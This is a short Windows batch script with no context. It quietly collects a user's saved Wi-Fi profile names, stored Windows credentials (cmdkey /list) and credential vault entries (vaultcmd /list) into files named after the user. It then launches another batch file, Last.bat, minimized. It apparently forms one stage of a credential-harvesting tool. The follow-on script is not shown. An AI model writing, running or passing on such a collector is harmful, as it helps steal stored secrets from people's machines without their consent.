@echo off

type nul > %username%PASTWIFI.txt

netsh wlan show profiles | findstr "Todos" >> %username%PASTWIFI.txt

type nul > %username%CMDKEY.TXT

cmdkey /list >> %username%CMDKEY.txt

type nul > %username%VAULTCMD.txt
vaultcmd /list >> %username%VAULTCMD.txt

start /min D:/PLACEHOLDER/UTILS/Last.bat

exit